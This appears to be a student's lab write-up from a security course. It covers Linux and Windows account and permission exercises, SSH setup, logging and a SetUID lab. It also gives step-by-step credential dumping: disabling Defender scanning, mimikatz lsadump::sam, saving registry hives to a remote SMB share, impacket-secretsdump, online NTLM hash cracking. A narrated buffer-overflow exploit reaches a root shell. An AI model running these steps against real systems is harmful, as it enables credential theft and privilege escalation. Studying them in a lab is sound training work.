# Exercise 1 Day 1
1. user ID: i used the command id
   group ID: i used the command group
   login shell: sudo cat /etc/passwd |grep kali

2. the command "groups" list the all the groups the user is added to
3. to find out all names of user accounts in my machine: sudo /etc/shadow
4. sudo groupadd testers
   sudo usermod -aG testers kali
5. su - kali
6. creating a user for tester to be added to home directory /bin/bash, i used sudo adduser tester
   sudo useradd tester only create a user with /bin/sh, it doesnt add it to the home directory.
7. to force the user to change the password on her/his first login, i used this command
   "sudo passwd -e tester"
8. verify that you can login as user "tester"
   i used "su - tester" to login and it autmatically told me to change password
9. also add the new user "tester" to the "testers" group
   "sudo usermod -aG testers kali"
10. temporarily login as user "tester" and verify the settings you applied
    "su - tester" then "groups"
11. as new user "tester" change the login shell to /usr/bin/zsh
    still logged in as tester, i typed the command "chsh", typed the password for tester, thenchangeed the login shell

# Exercise 2 Day 1
1. as user kali, create a file testfile.txt inside the Documents folder of your home directory
   enter the document folder with "cd Documents" the creat the file using "touch testfile.txt"
2 verify owner, group and permissions for this file
  i used the command "ll", the owner and group is kali, the file has read/write permission for user, then read for group and others
3. check as user tester (created above) whether you can read from and/or write to this file
   i changed permissions for Kali so other users can assess files created by user kali, then when i logged in with tester, then cd /home/kali/Documents, i was able to cat textfile.txt, but was not able to write into the file.
4. as user kali again, set permissions for testfile.txt such that tester is no longer able to read this file
   here i used the command "sudo chmod 640 textfile.txt" this command makes this file not accessible by others.
5. verify as user tester, that the change to the file you made has been effective
   i did same thing i did in number 3 above, but this time, i could not cat the file
6. as user kali set the group for the file testfile.txt such that members of group testers can read from and write to this file
   first, i changed the permission of the file so group can read and also write into the file. i used the command "sudo chgrp testers textfile.txt" to change the group ownership of the file
7. verify as user tester, that the change to the file you made has been effective
   logged in as tester, and the changes effected.
8. create a symlink ts and a hard link th inside /var/tmp that both point to textfile.txt
   for symlink, inside the /var/tmp directory, i typed the command, "ln -s /home/kali/Documents/textfile.txt ts.txt"
   for hardlink, inside same directory, "ln /home/kali/Documents/textfile.txt th.txt"
9.inspect the detailed output of the ls command on these two link files and in particular the differences
  the hardlink has the exact replica of the original file, both the permissions and the inode number(ls -lia), while in soft link those fitures and are not present, the colour is blue, the permissions and inode number are not same with the original file.
10. using cat command i read the containt of the original file via both links
11. as user kali create a directory /var/tmp/xchange, and set permissions to 777
    "mkdir /var/tmp/xchange" "sudo chmod 777 /var/tmp/xchange"
12. create a new testfile testfile2.txt in this directory with permissions, such that only the owner is able to write to this file
    inside the xchange directors, "touch textfile2.txt" then permission "sudo chmod 755 textfile2.txt"
13. as user tester, try to come up with an idea for how to provide /var/tmp/xchange/testfile2.txt with a different content .
     login as user tester, because i as user tester have the full permission into the directory (xchange), so, created another file in the directory which i called "textfile3.txt" then with this command "mv textfile3.txt textfile2.txt" this command overrrides the content of the textfile2.txt.


1.3
 1.for the user "tester" set the 01.08.2023 to be the day when the account expires
   Hint: you can use chage
   "sudo chage -E 2023-08-01 tester"
   "sudo chage -l tester" to confirm the change in the account
 2. have a look at the file /etc/login.defs and try to find out how to enforce, that new users have to change their password after N days
   "PASS_MAX_DAYS 35"
 3. setup a password policy using pam_pwquality with the following settings

    minimum length of password: 12  = pam_pwquality.minlen=12
    min number of lowercase letters: 3  = pam_pwquality.ucredit=3
    min number of uppercase letters: 3  = pam_pwquality.lcredit=3
    min number of digits: 2   = pam_pwquality.dcredit=2
    min number of symbols: 1  = pam_pwquality.ocredit=2
    reject passwords containing the user name  = pam_pwquality.gecoscheck=1
    enforce the policy also for the root user  = pam_pwquality.enforce_for_root


# DAY 2
1.4  
   1. find out details about your current (local) user, e.g. user SID, group
      Hint: you can use the snap-in lusrmgr.msc command or - recommended - use the PowerShell command Get-LocalUser
   2. find out all local group accounts on your machine with details
      Hint: you can use lusrmgr.msc again or Get-LocalGroup
   3.  create a new group "testers" on your system and add yourself to this group
       "New-LocalGroup "testers""
       "Get-LocalGroupMember testers"
       "Add-LocalGroupMember -Group testers -Member winnie"
   4. create an additional user "tester", set some password for your new user "tester" and force the user to change the password on her/his first login
      "$password = Read-Host AsSecureString" click enter, it will provide a space under to type the password *********
      "New-LocalUser -Name "tester" -password $password" click enter, it will create the user
      "net user "tester" /logonpasswordchg:yes" click enter
   5. also add the new user "tester" to the "testers" group
      "Add-LocalGroupMember -Group testers -Member tester"
      `Get-LocalGroupMember testers`
   
1.5
   1. as user winnie, create some testfile.txt inside your Documents directory with some content
      "cd \users\winnie\Documents"
      "echo "this is winnie's file" > testfile.txt"
   2. use either classical Explorer tools or icacls to inspect the permissions of this file
      "icacls testfile.txt"
   3. change permissions of this file such that no other users should be able to read the file
   ![Alt text](no%20read%20permission.png)

   4. as user tester verify, that your modification was effective
      login as tester, go to users, to winnie, to documents
   ![Alt text](testernotaccess%20file.png)

   5. back as user winnie, allow members of the group "testers" full access to this file
   ![Alt text](testersfullaccess.png)

   6. as user tester verify, that your modification was effective
      follow same process as step 4. 
   ![Alt text](testerreadfile.png)

1.6 Extended/Optional Windows Exercise
    change the local password policy with the following settings (e.g. using the snap-in secpol.msc)
        minimum length of password: 12
        maximal password age: 30 days
   Run powershell as administrator, type the command `secpol.msc` it will bring a platform for change of password
   ![Alt text](passwordbeforchange.png)
   ![Alt text](passwordafterchange.png)

# DAY 3
   SetUID LAB
2.1. "env" to print environmental variable
2.2.
   Passing Environment Variables from Parent Process to Child Process, In this task, we study how a child process gets its environment variables from its parent. In Unix, fork()creates a new process by duplicating the calling process. 
   The new process, referred to as the child, is an exact duplicate of the calling process, referred to as the parent; however, several things are not inherited by the child (please see the manual of fork() by typing the following command: man fork). 
   In this task,we would like to know whether the parent’s environment variables are inherited by the child process or not.

   Step 1. Please compile and run the following program, and describe your observation.

  ![Alt text](child.png)

   executing the program "myprintenv.c" for the child process using "gcc myprintenv.c", it produced a binary file, executing the binary file into another file with the command "./a.out > lab" and it printed all enviromental variables.
   for the parent process
   ![Alt text](parent.png)

   i followed same process to compile and run both the child and parents process, usind `diff` command to check the difference between the output of of both files
   output after checking the difference between the parents and the child process
![Alt text](diff.png)

   In summary, when a child process is created using fork(), it inherits a copy of the parent process's memory, but some process attributes are not inherited e.g. Process ID is unique for both because the are running different processes

2.3.
   In this task, we study how environment variables are affected when a new program is executed via execve().
   The function execve() calls a system call to load a new command and execute it; this function never re-turns. 
   No new process is created; instead, the calling process’s text, data, bss, and stack are overwritten by that of the program loaded. Essentially, execve() runs the new program inside the calling process. 
   We are interested in what happens to the environment variables; are they automatically inherited by the new program?

   Step 1. Please compile and run the following program, and describe your observation. This program
   simply executes a program called /usr/bin/env, which prints out the environment variables of the
   current process.
   The program myenv.c

![Alt text](myenv.c%20NULL.png)

compiling and executing the programme

![Alt text](myenv.c%20NULLcompiler.png)

   It was not able to print the env virables because it was set to NULL

   Now changing the invocation of execve() to `execve("/usr/bin/env", argv, environ)`
   
![Alt text](myenv.c%20environ.png)

   It printed the enviromental variables that are set for the current process
   
![Alt text](myenv.c%20environcompiler.png)

   In conclusion, the execve() function with three arguments: the path to the env command ("/usr/bin/env"), the argv array, and the environ variable, when set to `NULL`, the execve() system call cannot run the `env` command, but when changed to `environ`, the execve() system call will run the `env` command.


2.4 Task 4: Environment Variables and system()
   In this task, we study how environment variables are affected when a new program is executed via the
   system() function. This function is used to execute a command, but unlike execve(), which di-
   rectly executes a command, system() actually executes "/bin/sh -c command", i.e., it executes
   /bin/sh, and asks the shell to execute the command.
   If you look at the implementation of the system() function, you will see that it uses execl() to
   execute /bin/sh; execl() calls execve(), passing to it the environment variables array. Therefore,
   using system(), the environment variables of the calling process is passed to the new program /bin/sh.
   Please compile and run the following program to verify this.

   The program system.c
   ![Alt text](systemfile.png)

   After compilation
 ![Alt text](systemfilecompiler.png)  

   In summarry, When a program is executed via the system() function, the environment variables of the parent process (i.e., the calling program) are passed to the child process, it can be modified in the child process which does not affect the parent process, therefor, the system() function can be used to get access to the environmental variables, an attacker can modify the env variables to perform a task while the parent process is not affected. To protect against these types of attacks, it's important to carefully validate and sanitize any user input that could be used to set environment variables passed to the system() function.


2.5 Task 5: Environment Variable and Set-UID Programs
   Set-UID is an important security mechanism in Unix operating systems. When a Set-UID program
   runs, it assumes the owner’s privileges. For example, if the program’s owner is root, when anyone runs
   this program, the program gains the root’s privileges during its execution. Set-UID allows us to do many
   interesting things, but since it escalates the user’s privilege, it is quite risky. Although the behaviors of
   Set-UID programs are decided by their program logic, not by users, users can indeed affect the behav-
   iors via environment variables. To understand how Set-UID programs are affected, let us first figure out
   whether environment variables are inherited by the Set-UID program’s process from the user’s process.

   Step 1. Write the following program that can print out all the environment variables in the current process.
   setuid.c
   ![Alt text](setuidfile.png)

   Step 2. Compile the above program, change its ownership to root, and make it a Set-UID program
   ![Alt text](setuidfilecompiler.png)

   Step 3. In your shell (you need to be in a normal user account, not the root account), use the export
   command to set the following environment variables (they may have already exist):
   • PATH
   • LD LIBRARY PATH
   • ANY NAME (this is an environment variable defined by you, so pick whatever name you want)
   ![Alt text](setuidexport.png)

   After setting the variables but could not set the PATH variable because it already exist, i ran `env` command and saw and all the variables i exported
   ![Alt text](setuidenv.png)

   Running the set-uid program in step two, i noticed that in the child process created, the LD LIBRARY PATH is not there
   ![Alt text](setuidresut.png)

   i would say that the "LD_LIBRARY_PATH" environment variable may be restricted to prevent security risk.

2.6 Task 6: The PATH Environment Variable and Set-UID Programs

   Because of the shell program invoked, calling system() within a Set-UID program is quite dangerous.
   This is because the actual behavior of the shell program can be affected by environment variables, such as
   PATH; these environment variables are provided by the user, who may be malicious. By changing these
   variables, malicious users can control the behavior of the Set-UID program. In Bash, you can change
   the PATH environment variable in the following way (this example adds the directory /home/seed to the
   beginning of the PATH environment variable):
   ![Alt text](path.png)

   The Set-UID program below is supposed to execute the /bin/ls command; however, the program-
   mer only uses the relative path for the ls command, rather than the absolute path:
   ![Alt text](pathprogram.png)

   Please compile the above program, change its owner to root, and make it a Set-UID program. Can
   you get this Set-UID program to run your own malicious code, instead of /bin/ls? If you can, is your malicious code running with the root privilege? Describe and explain your observations.
   ![Alt text](pathresult.png)
   i can use the program to run a malicious code but its not running with root privilege, because it's EUID is 1000 which is for normal users


   # DAY 4 System Access and Authentication

   Windows Exercise 1 - Discover local passwords using mimikatz

   1.To download we need to deactivate windows security for dowloads, and also the path to the dowloaded mimikatz in other to run it
   Go to Start  > Settings  > Update & Security  > Windows Security > Virus & threat protection.
   Under Virus & threat protection settings, select Manage settings, and then under Exclusions, select Add or remove exclusions.

   ![Alt text](remove%20security.png)

   2.https://github.com/gentilkiwi/mimikatz/releases to download mimikatz, after download, unzip it.
   3.open a new Powershell window as administrator, change to your directory containing the just downloaded and extracted mimikatz.exe file, start mimikatz.exe

   ![Alt text](run%20mimikatz.png)

   4.enter the following commands
    token::elevate
    privilege::debug
    lsadump::sam
    ![Alt text](harsh%201.png)
    ![Alt text](harsh%202.png)

    5.crack passwords
    inspect the output of our mimikatz execution
    for the local users on your system (winnie, tester) you will find the value of Hash NTLM in the output of the command above
    copy these values
    use one of the various sites offering to crack NTLM hashes, e.g. https://crackstation.net/ or https://hashes.com/ and try to discover the cleartext passwords
    PASSWORD FOR WINNIE
   ![Alt text](clear%20password1.png)

    PASSWORD FOR TESTER
   ![Alt text](clear%20password2.png)

    EXERCISE 2
    In this exercise, we need to be able to transfer files from our Windows 10 instance to our Kali instance. For this purpose, we employ a technique that is native to Windows: SMB shares.

    1.on your Kali instance, provide an SMB share to receive relevant data
    change to some directory to which you want to upload data from your Windows machine (recommended: create a new directory)
    start an SMBv2 share myshare with some username and password (e.g. secretuser and secretpassword)

   ![Alt text](myshare.png)

    2.on your Windows instance, start a cmd or Powershell terminal as administrator
    authenticate to the SMB share
    net use \\10.10.10.20\myshare /user:secretuser secretpassword
    be aware that you need to replace 10.10.10.20, myshare, secretuser and secretpassword with your individual Kali IP address, share name, username and password
   ![Alt text](connectshare.png)

    4. dump the respective files for SAM to your SMB share provided by your Kali instance
    # Dump secrets using the registry
    reg.exe save hklm\sam \\10.10.10.20\myshare\sam.save
    reg.exe save hklm\system \\10.10.10.20\myshare\system.save
    reg.exe save hklm\security \\10.10.10.20\myshare\security.save
   ![Alt text](dumping%20file.png)

    5.back on our Kali, you can then start to analyze them
    terminate the impacket-smbserver process
    you should find the three files just created
    use the following command to dump the secrets
        impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL > secrets.out
   ![Alt text](check%20file.png)

    6. similar to Windows exercise 1, you can now use a platform of your choice to crack the passwords
   ![Alt text](harsh%20pass.png)

    




   # DAY 5 ACCESSING A SYSTEM REMOTELY

   The following exercises aim at setting up ssh connections to/from Linux and Windows machines. You can use the VMs provided to you in the lab environment, but we actually recommend to setup your own computer as an ssh client to be able to ssh to your Linux and Windows VM.

   Note that some commands require administrative privileges.

   Linux: You can use the sudo command, if your current user has respective privileges.
   Windows: For your PowerShell commands, you should open PowerShell as Administrator.
   SSH to Linux Exercise
   The exercise in this chapter aims at setting up secure remote access to your Kali Linux machine in the lab. As a ssh client machine, you can either use your own computer or your Windows VM - or both. In any case, all commands are executed using command line.
   The overall plan will be as follows:
   1.setting your client machine for ssh use
   2.setting up the ssh connection to your Linux VM
   3.setting up ssh connection to use public key authentication

   Preparation of your Kali VM as ssh server
   1.connect to your Kali VM and open a terminal `ssh kali@10.10.10.45`
   2.verify that the ssh-service is active  `sudo systemctl status sshd`
   the result should show Active: active (running)
   3.In your windows client run this command as an administrator to install open ssh client `Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0`

   ![Alt text](open%20ssh.png)
   
   4.In the windows machine as administrator, generate the ssh key with this command `ssh-keygen -t ed25519` also provide a password you can rememember

   ![Alt text](generate%20key.png)

   5.inspect the result of the ssh-keygen command by having a look at the files in the .ssh directory under your    users home directory in your windows machine

   ![Alt text](keygen%20inspection.png)

   6.provide your public ssh key pair to your Kali Vm.
   this involves copying the content of your public ssh key file (the one with .pub extension in your .ssh directory) ...... and appending it to the ~/.ssh/authorized_keys file on your Kali VM
   note that every public ssh key in the ~/.ssh/authorized_keys file needs to be stored on a separate line

   ![Alt text](pub%20key.png)
   ![Alt text](copied%20key.png)

   7.Load ssh key into ssh agent (Windows client) with the following commands
   
   ![Alt text](ssh%20agent.png)

   8.After the above commands, you can now logging remotely without password
   NOTE: This is for linux login

   FOR WINDOWS

   Set up ssh service on your Windows 10 VM in the lab
   1.connect to your Windows 10 VM in the lab via RDP
    start a PowerShell terminal as administrator
    install the OpenSSH server with this command `Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0`
    ![Alt text](settingwindowsserver.png)

   2.to start and configure OpenSSH Server, run the following commands
   `Start-Service sshd`

   # OPTIONAL but recommended:
   `Set-Service -Name sshd -StartupType 'Automatic'`

   # Confirm the Firewall rule is configured. It should be created automatically by setup. Run the following to verify        
    if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name,    Enabled)) {
    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
    } else {
    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
    }
   ![Alt text](configuration.png) 

   3.Connect to Windows 10 VM using ssh
     back on your computer where you setup the ssh client and ssh key pair, try to connect to the Windows 10 VM using ssh
        ssh -o IdentitiesOnly=yes winnie@<IP> for the respective IP address of your Windows VM
        note that you need to use the proper IP address of your Windows VM here
        also, -o IdentitiesOnly=yes is required :-(
        you have to provide the proper password for the Windows user winnie (or tester)
     ![Alt text](winnie%20login.png)

   4.Setup ssh public key authentication to your Windows 10 VM
    For this step, you should use either your own computer or the Kali VM. In any case, you need to have an ssh client and have created a public ssh key, as above. Also note that, since the user winnie belongs to the Administrators group, you have to cope with particular restrictions, so we recommend to ssh not to the winnie account but to the testers account which does not belong to the Administrators group.
    provide your public ssh key pair to your Windows VM

    first, copy the content of your public ssh key file (the one with .pub extension in your .ssh directory) ...
    then connect to your Windows VM as tester
    in the home directory of user tester create a directory .ssh
    then create a file .ssh/authorized_keys and append the previously copied public key into this file on your Windows VM
    note that every public ssh key in the .ssh/authorized_keys file needs to be stored on a separate line
    on your Windows 10 VM, you can use the Editor program to create and edit this file
   ![Alt text](pubwindows%20key.png)
   ![Alt text](creating%20directory.png)
   ![Alt text](copieng%20file.png)

   5.using the already discussed steps above, you should now be able to ssh to your Windows 10 VM


   # DAY 6 

   Buffer Overflow
   1.I download the LectureSetup.zip file to my VM, unziped it and got all the files needed for my practical work, i moved them to a folder called lecturesetup.
   All the files needed for this lab were included in this folder.
   ![Alt text](lecturesetupunzip.png)
   ![Alt text](lecturedir.png)

   2.I also downloaded an extended lab environment setup in KaliLabsetup.zip that allows me to
   follow the lab on on Kali Linux machine, unziped it and got a folder called kaliLabSetup

   ![Alt text](kalisetupunzip.png)

   3.I used this command to turn off the randomization countermesures so the attack will not be difficult `sudo /sbin/sysctl -w kernel.randomize_va_space=0`
   ![Alt text](countermeasure.png)

   4.I viewed my vulnerability program `stack.c` in the server-code folder which is in the kaliLabSetup directory.
   I used the compilation commands which are already provided in Makefile also in the server-code directory. with the command `make dockerall`, i was able to compile the vulnerability program saving them in the variables L1, L2, L3, and L4 as was set in Makefile; also the the program ``server.c` was compiled alongside. After the compilation, i copied all binary(server and stack) into the bof-containers folder with the command `make install`, so they can be used by the containers.
   ![Alt text](vulnerability%20compilation.png)
   ![Alt text](installation.png)

   5.Generating, compiling and testing the shell codes.
   The generic shellcode is in the shellcode folder. Inside, there are two Python programs, shellcode 32.py and shellcode 64.py. They are for 32-bit and 64-bit shellcode, respectively. These two Python programs will write the binary shellcode to codefile 32 and codefile 64 respectively.
   ![Alt text](generatingshellcode.png)
   ![Alt text](compiling%20shellcode.png)
   ![Alt text](testing%20shellcode32.png)  
   ![Alt text](testing%20shellcode64.png)

   6.Preparing my vulnerability program: I started the container with 4 servers working perfectly.
   # SERVER 1 EXPLOIT
   1. I listened to the server, i got the information about the ebp address and the buffer base address of the vulnerable server 1, subtracting the buffer base address from the ebp then adding it 4, i got my offset, adding 8 to ebp gave me the return address(ret).
   ![Alt text](setup1.png)
   ![Alt text](Attack%20result.png)
   ![Alt text](listening%20to%20server.png)

   2. Prepared my malicous code, ran it and got a file called bad file, used cat command to eccho it into the vulnerability code, i got the root priviledge.
   ![Alt text](exploit1.png)
   ![Alt text](exploit2.png)
   ![Alt text](Attack%20process.png)
   ![Alt text](root%20priviledge.png)

   # SERVER 2 EXPLOIT
   1. I listened to the server got only the address of the buffer base, in other to get the EBP, i ran the compiled stack-L2 in a debugger(gdb), i checked the assembly and execution part of the `bof function` where the buffer variable is in the stack in the stack program and got the hex value of the offset.
   ![Alt text](assembly.png)

   2. To get the EBP for the stack-L2 attack, i minused 4 from the offset, getting a decimal of 192, i added it to the base address,then got my EBP, added 8 to it in the exploit code, ran the exploit code and produced a bad file which was cat into the vulnerability program.
   ![Alt text](attack2%20ebp.png)
   ![Alt text](exploit%20task2.png)
   ![Alt text](attack%20processtask2.png)

   3. The result of the attack and access to root shell
   ![Alt text](server2%20result.png)
   ![Alt text](server2root.png)

   # DAY 7
   LOGGING AND MONITORING

   1. https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon to download sysmon use for system monitoring, unzip using this command `Expand-Archive`, go to the unzipped file folder, Copy the file Sysmon64.exe into C:\Windows, then run installation with this command `sysmon64 -i`
   2. `eventvwr.msc` to run sysmon
   ![Alt text](sysmon%20window.png)
   3.navigating to "Applications and Service logs" - "Microsoft"- "Windows"- "Sysmon" - "Operational"; check Event ID 15, shows the last downloaded file that met some conditions to create the such event, to know the conditions event were created, Download a more elaborate sysmon config file from https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml and save it e.g. to the desktop as sysmonconfig.xml, In the PowerShell window, change to the desktop directory of the user and install the sysmon config file using the following command `sysmon64 -c sysmonconfig.xml`
   Open the file sysmonconfig.xml in an editor and try to find the section, where the conditions for event ID 15 are defined or any other event.
   ![Alt text](event%20id%2015.png)
   3. Downloaded a new file that met the event condition, Opened and inspected the hash attribute; copied the value for SHA256 Open Virustotal in my browser https://www.virustotal.com, select "Search" and pasted the hash of the downloaded file into the form field; to verify that indeed the file i downloaded ist NOT a virus.

   # WINDOWS MONITORING
   1. I downloaded the process explorer https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer
   2. I ran both process explorer and windows task manager, the difference is that Process Explorer provides more visual, in-depth reports than Windows Task Manager.
   ![Alt text](difference%20task%20and%20explorer.png)

   # Linux Exercise 1 - Generate and Review Log Entries
   1. I started two windows, one to perform operation and the other to inspect the output, the one for output inspection i started `journalctl -f`
   ![Alt text](journal%20inspect.png)

   2. This command list output in a Json format
   ![Alt text](json%20format.png)
   ![Alt text](js%20output.png)

   3. I used list boots to know when my system has been rooboted and how often
   ![Alt text](boots.png)

   4. I Used the option -u <service-name> to find out about all logged events for ssh
   ![Alt text](-u%20command.png)
   ![Alt text](-u%20result.png)

   5. I tried to find out about login events for user tester using the user id
   ![Alt text](jounal%20for%20tester.png)

   # Linux Exercise 2 - Monitoring
   1. I made used of the ubuntu in my virtual machine, `ps aux` to list processes in the memory
   2. `last` command shows informationt about system boots `w` command shows how long the system has lasted during current boot same as `uptime`
   3. `cat /proc/$$/cmdline` to know the details  about my current shell, `cat /proc/meminfo`to get information about the memory of the system